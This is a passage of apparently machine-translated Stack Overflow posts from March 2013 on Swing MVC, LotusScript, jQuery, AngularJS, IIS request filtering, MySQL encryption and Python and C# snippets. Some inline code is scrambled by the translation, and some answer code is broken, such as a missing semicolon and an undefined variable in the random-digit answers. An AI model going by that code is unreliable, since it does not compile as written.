> 
> 时间：2013-03-27T01:53:04.147
> 
> 标签：javascript, css, jquery-ui, jquery-mobile

我知道这是一个非常极端的情况，所以可能没有（简单的）方法可以做到这一点，但是否有：

**A.**一种用漂亮的小动画清空元素（我的文本区域）内容的方法？

或者

**B.**一种制作页面卷曲动画的方法，它看起来好像元素和/或其内容正在被剥离、离开和移出视口，就好像它是纸一样？

# java - Java中MVC的类结构和位置

> ID：15650692
> 
> 赞同：2
> 
> 时间：2013-03-27T01:54:21.387
> 
> 标签：java, swing, model-view-controller, user-interface

我正在为数独程序编写 GUI。我正在尝试使用 MVC 框架。以下帖子是我当前大部分代码的基础： [为数独求解器构建 GUI（包含 ASCII 示例）](https://stackoverflow.com/questions/3409099/building-a-gui-for-a-sudoku-solver-complete-with-ascii-example)。我的问题是动作监听器去哪里了？我假设他们进入控制器，但它是一个类还是多个？我目前有一个带有单个动作侦听器和 if/else 逻辑的类来处理每个可以触发事件的摇摆组件。不过，这段代码对我来说很糟糕。有没有首选的方式来构建代码？我希望添加更多的按钮和组件，并且我想确保我正在做的路径是合理的。我已经阅读了很多帖子和网络教程，但还没有找到这个答案。

谢谢

```
public class SudokuView extends JFrame{
SudokuController controller;
//SudokuEngine sudokuEngine;

private static final int yMar = 100;
private static final int xMar = 25;
private static final int cellSize = 40;
private static final int gridSpace = 3;
private static final int secSpace = 9;
private static final int width = 2*xMar+9*cellSize+2*secSpace+6*gridSpace+10;
private static final int height = 650;

public JButton[][] gridButtons;

public SudokuView() {
    controller = new SudokuController();
    //sudokuEngine = new SudokuEngine();
    gridButtons = new JButton[9][9];
    setTitle("Sudoku Ninja 0.1");
    setSize(width, height);
    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    setLayout(null);
    setBackground(Color.GRAY);
    setResizable(false);

    DrawBlankGrid();

    setVisible(true);
}

public void setSudokuImplementation(SudokuEngineInterface listener) {
    controller.setListener(listener);
}

public final void DrawBlankGrid(){
    int y=yMar;
    for (int r=0;r<9;r++){
        int x=xMar;
        for (int c=0;c<9;c++){
            gridButtons[r][c]=new JButton("");
            gridButtons[r][c].setBounds(x,y,cellSize,cellSize);
            gridButtons[r][c].putClientProperty("caller", 1);
            gridButtons[r][c].putClientProperty("column", c);
            gridButtons[r][c].putClientProperty("row", r);
            gridButtons[r][c].addActionListener(new SudokuController());
            add(gridButtons[r][c]);
            if (c==2||c==5){
                x = x+cellSize+secSpace;
            }else{
                x = x+cellSize+gridSpace;
            }
        }
        if (r==2||r==5){
            y = y+cellSize+secSpace;
        }else{
            y = y+cellSize+gridSpace;
        }
    }
}

public class SudokuController implements ActionListener{
SudokuEngineInterface listener;

public void setListener(SudokuEngineInterface listener) {
    this.listener = listener;
}

@Override
public void actionPerformed(ActionEvent e) {
    if (e.getSource() instanceof JButton){
        JButton gridButtons = (JButton) e.getSource();
        System.out.println("clicked column " + gridButtons.getClientProperty("column") + ", row " + gridButtons.getClientProperty("row"));
    }
}
}

public class RunSudokuNinja implements Runnable{

@Override
public void run() {
    //SudokuEngineInterface sudokuEngine = new SudokuEngine();
    SudokuView sudokuView = new SudokuView();
    //sudokuView.setSudokuImplementation(sudokuEngine);
    sudokuView.setVisible(true);
}

public static void main(String[] args) {
    EventQueue.invokeLater(new RunSudokuNinja());
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-30T11:46:47.873

我明白了，[http](http://leepoint.net/notes-java/GUI/structure/40mvc.html) ://leepoint.net/notes-java/GUI/structure/40mvc.html非常有帮助。基本上是控制器中的内部类和视图中的 addListener 方法。这样组织更好

# lotus-notes - Lotus Notes Domino 获取日期差异

> ID：15650694
> 
> 赞同：1
> 
> 时间：2013-03-27T01:54:45.820
> 
> 标签：lotus-notes, lotusscript

我已经使用 lotusscript 编写了一个代码来计算两个字段之间的时间差，现在我想计算日期之间的差。我几乎已经开始使用 lotusscripting，但我仍然对它有一点了解。希望您能够帮助我。这是我为计算时差而编写的代码：

```
Sub UpdateDuration()
Dim ws As New NotesUIWorkspace
Dim uidoc As NotesUIDocument
Dim starttime As NotesDateTime
Dim endtime As NotesDateTime
Dim duration As Integer

Set uidoc = ws.CurrentDocument
If uidoc.FieldGetText("StartTime") = "" Then
    Exit Sub
Elseif uidoc.FieldGetText("StartTime") = "" Then
    Exit Sub        
End If
Set starttime = New NotesDateTime( uidoc.FieldGetText("StartTime") )
Set endtime = New NotesDateTime( uidoc.FieldGetText("EndTime") )
duration = endtime.TimeDifference( starttime )
Call uidoc.FieldSetText("Duration", Cstr(duration) )
Call uidoc.Refresh()
End Sub 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T03:18:25.647

TimeDifference 返回两个 NotesDateTimes 之间的秒数。一天有 60 * 60 * 24 秒，计算结果是 86400。所以只需完全按照上面的方式编写代码，然后将结果除以 86400。（您可能想要更改的唯一另一件事是您的字段和变量名称，以反映您使用日期输入而不是时间的事实。）

# .net - .Net System.Drawing.Image.Save 与网络凭据

> ID：15650697
> 
> 赞同：0
> 
> 时间：2013-03-27T01:55:11.037
> 
> 标签：.net, image

使用具有不同网络凭据的 System.Drawing.Image.Save 保存图像文件的最佳方法是什么？我的代码如下所示：

```
origFrame.Save(System.IO.Path.Combine(directoryName, filename)) 
```

但是，该路径位于不同的域中，因此我想通过该调用传递一些网络凭据，但我该怎么做呢？

编辑：为了使问题进一步复杂化，源机器在工作组中，而目标机器在域中。我试过 WNetAddConnection2 但我无法让它工作。

# javascript - 禁用输入类型=按钮的标签

> ID：15650699
> 
> 赞同：1
> 
> 时间：2013-03-27T01:55:16.400
> 
> 标签：javascript, jquery, html

所以，我有一个看起来像这样的标签：

```
<a id="createBtn" class="btn" title="" type="button">
<b>+</b>
Create New
</a> 
```

有时，我们希望它活跃，有时则不。我尝试了多种方法来禁用它，添加禁用的类，添加属性禁用，尝试删除类型属性（我了解到你不能这样做），将它绑定到阻止默认行为的函数，并使用 jquery 的`.bind('click', false)`，但似乎没有任何效果。

我想知道我可以用什么 js 或 jquery 来做这个标签来禁用它。它像被禁用一样变灰，但它仍然有与之相关的动作，这是一个主干

这是我尝试过的一些，而不是全部：

```
 this.$('#createBtn').addClass('disabled');
            this.$('#createBtn').attr('type', 'button');
            this.$('#createBtn').bind('click', false);

        } else {
            this.$('#createBtn').removeAttr('type');
            this.$('#createBtn').removeClass('disabled'); 
```

#createBtn 与更新在此主干视图的初始化方法中创建的 UI 的事件相关联。

```
"click #createBtn": "renderNewTemplate", 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:06:37.107

这就是我禁用`anchor`标签（`<a>`）的方式：

`href`通过删除其属性来禁用标签，并减少其`opacity`以增加效果：

```
$(document).ready(function(){
    $("#createBtn").click(function () { 
        $(this).fadeTo("fast", .5).removeAttr("href"); 
    });
}); 
```

并启用锚点：

```
$(document).ready(function(){
    $("#createBtn").click(function () { 
        $(this).fadeIn("fast").attr("href", "original href here"); 
    });
}); 
```

原始答案可以在这里找到 - 我只是在回收它，因为我在所有需要禁用锚标记的项目中都使用它

[如何使用 jQuery 启用或禁用锚点？](https://stackoverflow.com/questions/1164635/how-to-enable-or-disable-an-anchor-using-jquery)

# controller - 如何最好地将 Dynatree 树小部件包装在 Angular 指令中？

> ID：15650700
> 
> 赞同：2
> 
> 时间：2013-03-27T01:55:25.480
> 
> 标签：controller, angularjs, dynatree, directive

我了解 Angular 控制器和指令的基本功能，但我正在努力了解如何最好地应用它们来包装我们使用的 Dynatree 树小部件。

问题是 Dynatree 通常有自己的方式通过 ajax 检索数据并填充自身 - 通常您通过调用其“appendAjax”方法将数据附加到特定树节点来执行此操作 - 即它的全部操作。

我知道我可以分离对 Ajax 方法的调用并将其放置在控制器中，将 ajax 调用的结果存储在我自己的树对象中 - 然后我可以在我的指令中观察该树对象的更改，然后手动更新 Dynatree 小部件. 但是我正在处理的树数据庞大而复杂，当 dynatree 已经拥有自己的树结构时，必须在控制器中维护自己的树结构似乎相当低效。

我的感觉是，在这种情况下，我真的不需要控制器，相反，我可以将 Dynatree 包装在一个指令中，并基本上按照我一直使用它的方式继续使用它，但这似乎不起作用 - 而这个可能是我缺乏关于指令的 Angular 知识的地方。所以我有几个问题：

1] 在指令中进行任何类型的 ajax 调用是否被认为是不好的做法？

2] 如果是这样，我应该如何包装这个喜欢以某种方式做事的第 3 方控件？我*真的*需要在我的控制器中维护我自己的重复树结构吗？

3] 如果认为可以在指令中进行 Ajax 调用，我如何确保 ajax 方法在指令中运行？（我假设这是我的问题的原因）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T14:40:04.083

如果它有任何帮助，这是我们在 hawtio 中使用[的](http://hawt.io/)[指令](https://github.com/hawtio/hawtio/blob/master/hawtio-web/src/main/webapp/app/tree/doc/developer.md#tree-plugin)，用于将 jquery dynatree 包装为 AngularJS 指令。

这是[源代码](https://github.com/hawtio/hawtio/blob/master/hawtio-web/src/main/webapp/app/tree/js/treePlugin.ts#L1)（它在 TypeScript 中，但你应该明白；它主要是 JavaScript）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-07T18:42:01.450

我遇到了类似的问题并得到了相同的结论。加载指令后，我的 ajax 调用返回，因此指令以没有数据结束。为此，我有 4 个解决方案，我相信最后一个可能是最好的。

1.  在 ajax 调用成功时插入指令。您可以创建一个 angular.element("myDirective") 然后将其插入到 DOM 中，然后在该元素上运行 $(compile)。从 ajax 调用返回的数据可以存储在控制器中，也可以存储在常量或本地存储或任何您能想到的存储中。
2.  创建一个同步调用......我知道可怕
3.  完成 ajax 调用后重新编译指令。与 1 类似，但在这种情况下，我们运行该指令两次而不是一次。
4.  树的 .children 属性可以通过在 ajax 调用成功时启动的观察程序来设置。不确定dynatree的api是否有办法动态插入数据？？我认为不确定

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T02:51:45.613

1] 在指令中进行任何类型的 ajax 调用是否被认为是不好的做法？

我不这么认为。如果是这样，Angular 将没有“控制器”属性，您可以在其中添加任意代码，包括 Ajax 调用。在此处查看我的博客文章 [http://theocdcoder.com/guide-angularjs-directives-part/](http://theocdcoder.com/guide-angularjs-directives-part/)

2] 如果是这样，我应该如何包装这个喜欢以某种方式做事的第 3 方控件？我真的需要在我的控制器中维护我自己的重复树结构吗？

我认为最好的选择是创建一个包装您的 Ajax 调用的服务，并从链接方法调用该服务。在此之前，您需要通过链接函数中的 JQuery/Javascript 代码初始化 Dynatree，将事件侦听器添加到 Dynatree 事件中，这些事件将存在于您的链接函数中。在这些事件侦听器中，您可以进行更多的 Ajax 调用或根据需要修改 dom。您还可以添加 $attr.$observe 或 $scope.$watch 来监听来自外部的变化。使用 $scope.$broadcast 与父控制器通信或使用范围绑定来调用控制器函数的方法。

3] 如果认为可以在指令中进行 Ajax 调用，我如何确保 ajax 方法在指令中运行？（我假设这是我的问题的原因）。有关示例，请参阅我的博客文章。

您可以发布 JSFiddle 以获得更清晰的信息。

# java - 如何在构造函数之外将 Jlabel 添加到 Jpanel？

> ID：15650701
> 
> 赞同：1
> 
> 时间：2013-03-27T01:55:28.497
> 
> 标签：java, swing, jlabel

我可以在 Jpanel 构造函数中使用 add(new Jlabel()) 在我的 Jpanel 上创建标签，但是一旦我使用其他函数调用 add()，标签就不会显示在面板上。我做错了什么？

```
public class DisplayPanel extends JPanel {

        JLabel headerField = new JLabel("Choose a file to generate report.");

        JLabel dateField = new JLabel("123");
        JLabel meanField = new JLabel("");

        JLabel minField = new JLabel("");

        JLabel maxField = new JLabel("");

        JLabel stdDevField = new JLabel("");

        public DisplayPanel() {
        super();
                setBackground(Color.white);
                setLayout(new GridLayout(6, 1));

        add(headerField);
        **//add(new JLabel("123")); this will work**

        }

        public void setFields(DataManager d)
        {
            dateField.setText(d.getStartDate() + " - " + d.getEndDate());
            meanField.setText("Mean: " + d.getMean());
            minField.setText("Min: " + d.getMin());
            maxField.setText("Max: " + d.getMax());
            stdDevField.setText("Std Dev: " + d.getStdev());
            this.add(new JLabel("123")); **//this doesn't work**
        } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-27T02:00:43.807

为了让任何新添加的组件在 可见后出现，您通常`JPanel`需要调用和。原因是`revalidate()``repaint()`

```
add(new JLabel("123")); 
```

在构造函数中工作，`JPanel`当添加到*其*容器（通常是`JFrame`. 在初始化阶段添加标签更简单，因为您只需调用`JLabel#setText`并且不需要`revalidate/repaint`调用。

# android - 两个 Eclipse Android 项目：一个是小部件，一个是普通应用程序。如何连接？

> ID：15650702
> 
> 赞同：1
> 
> 时间：2013-03-27T01:55:36.270
> 
> 标签：android, eclipse, android-intent

我查看了开发站点上的帮助：http: [//developer.android.com/guide/topics/appwidgets/index.html](http://developer.android.com/guide/topics/appwidgets/index.html)

缺点是，我的代码找不到我的应用程序的类。

```
Intent intent = new Intent(context, <package for main activity>.MainActivity.class);
PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 0);

RemoteViews view = new RemoteViews(context.getPackageName(), R.layout.main);
view.setOnClickPendingIntent(R.id.widget_textview, pendingIntent); 
```

MainActivity 的包位于 Eclipse 中一个完全不同的项目中。

所以我将 MainActivity 的包添加到我的小部件的构建路径中，并将其放在订单的前面。

构建顺序：

-->主要活动包<--

小部件/src

小部件/gen

安卓 4.2.2

安卓依赖

该应用程序已经在我的模拟器上，并且运行良好。

该小部件工作正常，无需尝试连接到应用程序（因此没有那 4 行）

这是我尝试连接两者并安装到模拟器时得到的结果：

[小部件] ------------------

[小部件] Android 启动！

[Widget] adb 运行正常。

[小部件] 未找到启动器活动！

[Widget] 启动只会同步设备上的应用包！

[Widget] 执行同步

[小部件] 自动目标模式：使用现有的模拟器 'emulator-5554' 运行兼容的 AVD 'NexusS'

[Widget] 将 Widget.apk 上传到设备 'emulator-5554'

[Widget] 安装 Widget.apk...

[小工具] 成功！

[Widget] 找到项目依赖，安装：MainActivity

[MainActivity] 应用程序已部署。无需重新安装。

[Widget] /Widget/bin/Widget.apk 安装在设备上

[小工具] 完成！

小部件被抛出，但不起作用。仅显示默认字符串值。一行代码有错误

```
Intent intent = new Intent(context, <package for main activity>.MainActivity.class); 
```

这基本上是说“找不到类”

关于如何获得这门课的任何帮助？Eclipse 在尝试链接之前没有制作 .class 文件吗？

请注意，该代码 Eclipse 存在 0 个问题。它确实承认已经导入了另一个项目，并且可以制作类。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:13:36.537

谷歌有很棒的文档。您可能希望向内容提供者透露您的数据：

[http://developer.android.com/guide/topics/providers/content-providers.html](http://developer.android.com/guide/topics/providers/content-providers.html)

[http://developer.android.com/guide/topics/appwidgets/index.html](http://developer.android.com/guide/topics/appwidgets/index.html)

# facebook - FQL 从多个用户获取提要

> ID：15650703
> 
> 赞同：0
> 
> 时间：2013-03-27T01:55:42.523
> 
> 标签：facebook, facebook-fql

我需要检索多个 Facebook 用户的墙帖。到目前为止，我设法只从一个用户那里检索数据，但我需要从大约 60 个用户那里获取数据。这是我在目标 C 中的 FQL 查询，我知道查询语法在每种语言中都是相同的：

```
[fql.parameters setObject:@"SELECT message,attachment FROM stream WHERE source_id in 
(SELECT id from profile where username = 'zara' )" forKey:@"q"]; 
```

请我需要帮助！提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:29:56.517

您可以通过在一组用户名中查找更新来做到这一点：

```
SELECT message,attachment FROM stream WHERE source_id in 
 (SELECT id from profile where username IN ('zara','zuck','theuncrunched','thepaulcarr')) 
```

# java - 从方法中调用 Int？

> ID：15650705
> 
> 赞同：-3
> 
> 时间：2013-03-27T01:56:10.330
> 
> 标签：java, random

我需要将我使用 4 个随机不同数字（不重复）创建的 int 返回给 main 方法，以便我可以将它用于我的其余工作。我也不能使用字符串方法。我希望它打印随机数

这就是我所拥有的：

```
public static void main(String[] args) {
      int generateSecretNumber;
      System.out.print("Random number is: "+generateSecretNumber);

}

public static int generateSecretNumber(int w, int x, int y, int z, int secretNumber) {
    Random ran = new Random();

    w = ran.nextInt();
    x = ran.nextInt();
    y = ran.nextInt();
    z = ran.nextInt();

    while (w == x || w == y || w == z){
    w = ran.nextInt();
    }
    while (x == w || x == y || x==z){
    x = ran.nextInt();
    }
    while (y == w || y == x || y == z){
    y = ran.nextInt();
    }
    while (z == w|| z== x || z == y){
    z = ran.nextInt();
    }

    if (w != x && x != y && y!=z){

    secretNumber = w + x + y + z;
    }

    return secretNumber;
}

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:10:32.790

在您的代码中，您实际上从未调用过您的`generateSecretNumber()`方法，而是声明了一个变量。删除 main 中的声明，并将打印行更改为`System.out.print("Random number is: " + generateSecretNumber());`.

接下来，该`generateSecretNumber()`方法不应该有任何参数，因为它完全由它自己决定要做什么，并且不需要任何外部数据。由于参数没有了，你还需要`int w, x, y, z;`在它的开头声明。

其次，您正在生成一个没有上限的随机整数。这根本不是您想要的，相反，您的`rand.nextInt()`调用上限应该是 10，导致`rand.nextInt(10)`. 这将选择一个从 0 到 9 的随机整数。

最后，您返回的是数字的总和，而不是他们实际生成的四位数。相反，返回每个数字的总和乘以它们的位置。例如，第四位数字应该是`w * 1000`。

结果代码示例：

```
public class RandUniqueFourDigits {
    public static void main(String[] args) {
        System.out.println("Random number is: " + generateSecretNumber());
    }

    public static int generateSecretNumber() {
        Random rand = new Random();
        int w = 0, x = 0, y = 0, z = 0;

        // Generate each digit until they're all unique
        while(w == x || w == y || w == z || x == y || x == z || y == z) {
            w = rand.nextInt(10);
            x = rand.nextInt(10);
            y = rand.nextInt(10);
            z = rand.nextInt(10);
        }

        // Generate each digit until they're all unique
        w = rand.nextInt(10);
        do x = rand.nextInt(10); while(x == w)

        // Combine them into one integer and return
        return w * 1000 + x * 100 + y * 10 + z;
    }
} 
```

对于更有效的循环（每个数字仅在需要时重新生成，就像您的初始代码一样），将 while 循环完全替换为：

```
w = rand.nextInt(10);
do x = rand.nextInt(10); while(x == w);
do y = rand.nextInt(10); while(y == w || y == x);
do z = rand.nextInt(10); while(z == w || z == x || z == y); 
```

导致：

```
public class RandUniqueFourDigits {
    public static void main(String[] args) {
        System.out.println(generateSecretNumber());
    }

    public static int generateSecretNumber() {
        Random rand = new Random();
        int w = 0, x = 0, y = 0, z = 0;

        // Generate each digit until they're all unique
        w = rand.nextInt(10);
        do x = rand.nextInt(10); while(x == w);
        do y = rand.nextInt(10); while(y == w || y == x);
        do z = rand.nextInt(10); while(z == w || z == x || z == y);

        // Combine them into one integer and return
        return w * 1000 + x * 100 + y * 10 + z;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:11:10.970

考虑到没有多少数字，您可以在内存中计算所有数字并从中返回一个随机值。

```
public class RandomGenerator {
    private static final List<Integer> numbers;
    private static final Random random = new Random();

    static {
        for(int i = 1000; i < 10000; i++) {
            int x = i%10;
            int y = (i/10)%10;
            int z = (i/100)%100;
            int u = (i/1000);

            // Check for uniqueness
            if(unique) { numbers.add(i); }
        }
    }

    public static Integer getNumber() {
        return numbers.get(random.nextInt(numbers.size()));
    }
} 
```

# c# - 单元测试控制器方法属性

> ID：15650706
> 
> 赞同：0
> 
> 时间：2013-03-27T01:56:16.837
> 
> 标签：c#, unit-testing, casting, controller, viewresult

我正在研究 Apress 的 Pro ASP.NET MVC 4，并试图了解单元测试特定控制器方法中使用的语法。

给定一个类的控制器方法`SomeController`：

```
public ViewResult List(int someInt) {

  ViewModel model = new ViewModel {
    ModelObject = new ModelObject {
      ObjectProperty = someInt;
    }
  }

  return View(model);
} 
```

单元测试看起来像这样：

```
[test method]
Some_Test () {

   //...some code here to set up a mock object named 'mock'

   SomeController target = new SomeController(mock.Object);

   //This next line is where the syntax is confusing me
   int result = ((ViewModel)target.List(1).Model).ModelObject.ObjectProperty;

   Assert.AreEqual(result, 1);
} 
```

几乎就像`ViewResult.Model`必须将其“强制转换”为类型`ViewModel`或其他东西。我确信这种语法/技术有一个名称，我想了解更多关于这里发生的事情。

是否需要这种技术，因为类似：

```
 int result = target.List(1).Model.ModelObject.ObjectProperty; 
```

不能访问`model`传递给视图的对象的属性？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:04:42.617

它只是嵌入到方法链中的简单转换。 `target.List(int)`返回一个[`ViewResult`](http://msdn.microsoft.com/en-us/library/system.web.mvc.viewresult%28v=vs.108%29.aspx)。 [`ViewResult.Model`](http://msdn.microsoft.com/en-us/library/system.web.mvc.viewresultbase.model%28v=vs.108%29.aspx)类型为 an`Object`以便可以使用任何模型类型。在您的测试中将其转换为您的`ViewModel`类型对于告诉编译器是什么类型`Model`是必要的。它相当于：

```
ViewModel model = (ViewModel)target.List(1).Model;
int result = model.ModelObject.ObjectProperty; 
```

# security - 拒绝文件访问，但在 IIS 中正确服务器

> ID：15650710
> 
> 赞同：2
> 
> 时间：2013-03-27T01:56:52.493
> 
> 标签：security, iis

我有一个包含在母版页中的 js 文件。

当用户在浏览器地址栏中键入直接链接时，我想拒绝文件访问。

我已经尝试过 URL 过滤 IIS，例如：

```
<security>
        <requestFiltering>
            <denyUrlSequences>
                <add sequence="Scripts/Foo/bar.min.js" />
            </denyUrlSequences>
        </requestFiltering>
    </security> 
```

这确实有效，当我输入“localhost://blah/Scripts/Foo/bar.min.js”时，我被阻止了。

**但是需要这个js文件的页面无法呈现。**

有人有解决方法吗？提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-28T05:50:03.887

我终于找到[了这个](http://www.iis.net/configreference/system.webserver/security/requestfiltering/filteringrules/filteringrule/appliesto)。

并将这些部分添加到 web.config：

```
<security>
  <requestFiltering>
    <filteringRules>
      <filteringRule name="protectjs" scanUrl="true" scanQueryString="true">
        <scanHeaders>
          <clear />
          <add requestHeader="Accept" />
        </scanHeaders>
        <appliesTo>
          <clear />
          <add fileExtension=".js" />
        </appliesTo>
        <denyStrings>
          <clear />
          <add string="text/html" />
        </denyStrings>
      </filteringRule>
    </filteringRules>
  </requestFiltering>
</security> 
```

它目前有效，但我知道这种方式并不可靠。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T12:43:32.993

不是 100% 肯定，但我认为没有办法做到这一点。当浏览器呈现您的页面时，它实际上向服务器发送的请求与您在浏览器中手动键入 JS 文件时所做的请求相同。

IIS 无法区分您发出的请求和一个浏览器在处理您的页面时在后台发出的请求。

可能有效的一件事是

1.  向您的 JS 文件添加某种 ID，例如 Scripts/Foo/bar.min.js?ID=E3CF305B-4444-E011-8FD2-1CC1DEE89A7F
2.  ID 是有时间限制的，并且在创建后仅 20 秒左右工作（足够的时间让浏览器加载页面）
3.  创建将解析 ID 并决定服务器是否应返回请求的自定义处理程序

因此，当有人键入 Scripts/Foo/bar.min.js 时，处理程序将拒绝请求，但在使用过期 ID 时它也会拒绝请求。

但是，这很可能很难维护，并且对您的服务器来说也是性能密集型的。

如果你想隐藏你的 JS 文件，为什么不混淆它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-04T19:05:11.637

使用 HttpModule 并检查 HttpContext.Current.Request.UrlReferrer。对于直接访问 .js 文件，它将始终为 null。

```
public class JSAccessModule : IHttpModule
{
    public void Init(System.Web.HttpApplication Appl)
    {
        Appl.BeginRequest += new System.EventHandler(Rewrite_BeginRequest);
    }

    public void Rewrite_BeginRequest(object sender, System.EventArgs args)
    {
        //Block if direct Url is accessed
        if (HttpContext.Current.Request.UrlReferrer == null)
        {
            HttpApplication App = (HttpApplication)sender;
            string path = App.Request.Path;

            string strExt = System.IO.Path.GetExtension(path);
            if (strExt == ".js")
            {
                HttpContext.Current.Response.Redirect("~/AccessDenied.html");
            }
        }
    }

    public void Dispose() { }
} 
```

# php - 如何加密现有的 MySQL 数据库？

> ID：15650712
> 
> 赞同：5
> 
> 时间：2013-03-27T01:57:40.693
> 
> 标签：php, mysql, sql, security

我们公司需要先对机密数据进行加密，然后再将其发送给我们进行 PHP 开发。他们在问我们解决这种情况的最佳方法是什么。

要求是必须解密数据。

是否有免费/商业工具可以做到这一点，或者只能通过 PHP 或 Linux 命令完成？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-27T02:33:59.373

MySQL 已经包含可逆[加密函数](http://dev.mysql.com/doc/refman/5.5/en/encryption-functions.html)，例如 AES_ENCRYPT()。

您可以通过以下方式逐列打乱敏感数据：

```
UPDATE SomeTable SET sensitive_column = AES_ENCRYPT(sensitive_column, 'password'); 
```

这至少适用于字符串数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-24T23:10:12.200

在我看来，基于人们并不真正想要加密数据本身的要求。人们可能想要屏蔽数据，例如。将表格中的值从真实姓名、地址、电话号码更改为新的虚构值，以用于开发和应用程序测试。 [http://en.wikipedia.org/wiki/Data_masking](http://en.wikipedia.org/wiki/Data_masking)

# eclipse - 在 Eclipse 上阻止 Internet 连接

> ID：15650713
> 
> 赞同：1
> 
> 时间：2013-03-27T01:57:51.310
> 
> 标签：eclipse, firewall

这是否可以阻止 Eclipse 上的所有网络连接？

我的情况是我在 Eclipse 中有单元测试，我想看看哪些单元测试尝试连接到网络。从源代码中很难弄清楚，我认为最简单的方法是阻止连接并查看哪个会失败。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T07:22:15.490

拔下您的网线（或在您的操作系统中选择相应的开关）。确实，这比手动切换 eclipse 中的代理更快（也更可靠）。

如果你反复想检查这样的事情，那么我发现在虚拟机中运行 eclipse 非常方便，你可以通过单击轻松插入/拔出虚拟机的网络连接器，而不会干扰你的其他程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:01:53.450

有时我这样做：

在 Eclipse 首选项中，General->Network Connections，将“Active Provider”选择为“Manual”，并设置无效代理。

# python - 使用python的密钥和字符串进行简单加密

> ID：15650718
> 
> 赞同：-1
> 
> 时间：2013-03-27T01:59:18.683
> 
> 标签：python

这是我的代码需要做的一个例子：

```
encrypt('7521068493', '123')
# returns '521' 
```

第一个字符串是替换的键，`0-9`例如`7`is `0`, `5`is `1`, `2`is `2`, `1`is `3`, 等等。

第二个字符串是需要加密的字符串。

这是我的代码：

```
def encrypt(key, string):
    for i in range(len(key)):
        string in i
            print(string) 
```

我想不明白

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:05:13.450

```
def encrypt(key, msg):
    cypher = {x: y for x, y in zip('0123456789', key)}
    encrypted = []
    for c in msg:
        encrypted.append(cypher[c])
    return ''.join(encrypted) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:16:56.920

我喜欢@Peter 的解决方案。`encrypted`您可以通过不在每个循环中添加而不创建列表和时间来节省内存。

```
def encrypt(key, msg):
    cypher = {x: y for x, y in zip('0123456789', key)}
    return ''.join(cypher[c] for c in msg) 
```

将列表或生成器作为参数的事物可以传递所谓的*“生成器理解”*作为参数，而不是列表本身。这样就不必单独构建该列表，并且许多人会同意它更易于阅读。仅当您的时间较长时，这主要有助于提高性能`msg`。

# python - python创建一个方程组的函数，用于fsolve

> ID：15650721
> 
> 赞同：0
> 
> 时间：2013-03-27T01:59:45.853
> 
> 标签：python, function, scipy

假设我想求解一个由迭代表达式创建的非线性方程组，即 x[i]-2*x[i-2]...=1/x[i]**2。

为了实现这一点，我想使用 scipy 包中的 fsolve 。所以我首先要创建一个函数f(x)，即

```
def func f(x, imax): 

    for i in range(imax):

      y = [ x[i]-2*x[i-2]...-1/x[i]**2, ] #this should be a matrix containing the  

                                          #equations in where all the equations are 

                                          # seperated with ',' 
return y 
```

在不知道先验 imax 的情况下。有什么建议么？

# c# - 如何覆盖 Forms.WebBrowser 中的打印

> ID：15650723
> 
> 赞同：0
> 
> 时间：2013-03-27T02:00:33.913
> 
> 标签：c#, printing, webbrowser-control

System.Windows.Forms 中的 WebBrowser 类未`DrawtoBitmap`按照 msdn 中的说明正确处理该方法。

我希望重写该`OnPrint`方法并执行我自己的绘图代码。

我尝试覆盖`OnPrint(PrintEventArgs e)`WebBrowser 类中的方法并调用代码，但打印不会改变。

我也尝试过捕获`WM_PRINT`方法（0x317），然后从消息句柄创建我自己的图形。我尝试过使用 NativeMethods，例如`BeginPaint`,`SelectObject`和`EndPaint`. 再次调用代码，但打印不会改变。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T02:32:10.420

覆盖`WndProc(ref Message m)`方法。

```
if (m.Msg == 0x317 || m.Msg == 0x318) //WM_PRINT, WM_PRINTCLIENT
{
    using (Graphics g = Graphics.FromHdc(m.WParam))
    {
        //Draw here
    }
} 
```

# c# - 如何加速输出字符串的缓冲？

> ID：15650724
> 
> 赞同：0
> 
> 时间：2013-03-27T02:00:35.957
> 
> 标签：c#, windows-7, visual-studio-2012

此代码对输出 ~380Kb 字符串的两种方法进行了计时：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace ConsoleApplication1
{
    class Program
    {
        static string outbuff = "";
        static void Main(string[] args)
        {
            {
                Stopwatch exectime = new Stopwatch();
                System.IO.StreamWriter file;
                exectime.Reset(); exectime.Start();
                file = new System.IO.StreamWriter("output.html");
                for (int i = 0; i < 18000; i++)
                {
                    outbuff += "444444444, 5555555555\n";
                }
                string fin = "\nString method took " + exectime.Elapsed.TotalSeconds + "s";
                file.WriteLine(outbuff);
                Console.WriteLine(fin);
                file.WriteLine(fin);
                file.Close();
            }
            {
                Stopwatch exectime = new Stopwatch();
                System.IO.StreamWriter file;

                exectime.Reset(); exectime.Start();
                file = new System.IO.StreamWriter("output2.html");
                for (int i = 0; i < 18000; i++)
                {
                    file.Write("444444444, 5555555555\n");
                }
